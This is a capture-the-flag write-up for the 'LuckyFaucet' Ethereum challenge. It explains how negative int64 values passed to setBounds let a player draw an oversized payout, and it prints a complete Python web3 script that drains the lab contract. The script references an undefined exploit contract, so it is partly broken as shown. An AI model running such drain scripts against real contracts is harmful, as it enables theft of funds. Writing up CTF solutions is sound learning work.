solved by Fire Lord of the West🔥

challenge files:
[LuckyFaucet.sol](./LuckyFaucet.sol)
[Setup.sol](./Setup.sol)

The challenge gave us a contract for an ETH faucet . 
After analyzing the code , we will see that there is one special functions called `setBound` 

```js
function setBounds(int64 _newLowerBound, int64 _newUpperBound) public {
        require(_newUpperBound <= 100_000_000, "100M wei is the max upperBound sry");
        require(_newLowerBound <=  50_000_000,  "50M wei is the max lowerBound sry");
        require(_newLowerBound <= _newUpperBound);
        // why? because if you don't need this much, pls lower the upper bound :)
        // we don't have infinite money glitch.
        upperBound = _newUpperBound;
        lowerBound = _newLowerBound;
    }
```

Those `require` statements seems insecure because it didn't take in account the scenario where a negative integer is passed into the functions . Which will cause an underflow and those `upperBound` and `lowerBound` value will be super large (urgh just like C)  . Resulting in  the `amountToSend` to be huge as well .  
So in conclusion , it's really easy to exploit  .  Invoke `setBounds`  to some negative number and then call `sendRandomEth ` 
I attached the exploit code as well . But i'm confident that this challenge can be solved with `cast ` - a CLI tool to interact with smart contracts .

here's the solve script

```py
'''
https://blog.solidityscan.com/weak-block-based-prng-in-solidity-f29e089de594
https://medium.com/coinmonks/attack-on-pseudo-random-number-generator-prng-used-in-cryptogs-an-ethereum-cve-2018-14715-f63a51ac2eb9
https://ad3sh.medium.com/hackthebox-magic-vault-challenge-walkthrough-4889ba11c6a6
blockhash(uint blockNumber) returns (bytes32): hash of the given block when blocknumber is one of the 256 most recent blocks; otherwise returns zero
'''

from web3 import Web3 
from eth_account import Account
import json
import os 
from web3 import Web3
import json
rpc_url= os.getenv("FOUNDRY_ETH_RPC_URL") 


private_key= os.getenv("PRIVATE_KEY") 
address = os.getenv("ADDRESS")

setup_contract_addr = os.getenv("SETUP_CONTRACT") 
setup_contract_abi =[
	{
		"inputs": [],
		"stateMutability": "payable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "TARGET",
		"outputs": [
			{
				"internalType": "contract LuckyFaucet",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
] 


target_contract_addr = os.getenv("INSTANCE_ADDRESS") 
target_contract_abi = [
	{
		"inputs": [],
		"stateMutability": "payable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "lowerBound",
		"outputs": [
			{
				"internalType": "int64",
				"name": "",
				"type": "int64"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "sendRandomETH",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			},
			{
				"internalType": "uint64",
				"name": "",
				"type": "uint64"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "int64",
				"name": "_newLowerBound",
				"type": "int64"
			},
			{
				"internalType": "int64",
				"name": "_newUpperBound",
				"type": "int64"
			}
		],
		"name": "setBounds",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "upperBound",
		"outputs": [
			{
				"internalType": "int64",
				"name": "",
				"type": "int64"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]



# Initialize web3
web3 = Web3(Web3.HTTPProvider(rpc_url))
setup_contract = web3.eth.contract(address=setup_contract_addr,abi=setup_contract_abi)
target_contract = web3.eth.contract(address=target_contract_addr,abi=target_contract_abi)
exploit_contract = web3.eth.contract(address=exploit_contract_addr,abi=exploit_contract_abi)

# Init account 
account = Account.from_key(private_key)
web3.eth.default_account = address 



def _my_balance():
    bal = web3.eth.get_balance(address) 
    print("Wallet bal" ,bal);

def _callSendRandomETH(): 
    send,amountContractSend= target_contract.functions.sendRandomETH().call({'from':address})
    print("SendRandomEth()",amountContractSend)
    print("ETH sent ? ",send)
    return send ,amountContractSend

def sendRandomETH() : 
	target_contract.functions.sendRandomETH().transact({'from':address})

def _setBounds(): 
	target_contract.functions.setBounds(-100000000,-1).transact({'from':address})
	#Check bounds set 
	l =target_contract.functions.lowerBound().call()
	u =target_contract.functions.upperBound().call()
	print (f"Lower Bound : {l},  Upper bound : {u}") 
	return l , u 

# def multipleSend():
# 	exploit_con_bal = exploit_contract.functions.multipleSend().transact({'from':address})
# 	return exploit_con_bal 

def check_target_contract_balance():
	balance = web3.eth.get_balance(target_contract_addr)
	print("Target contract balance:", web3.from_wei(balance, 'ether'), "ETH")
	return web3.from_wei(balance,'ether')

def check_if_solved():
    is_solved = setup_contract.functions.isSolved().call()
    print("Is the Lucky Faucet contract solved?", is_solved)

if __name__=="__main__":
	_my_balance()
	check_target_contract_balance()
	_setBounds()
	_callSendRandomETH()	
	sendRandomETH()
	check_if_solved()
```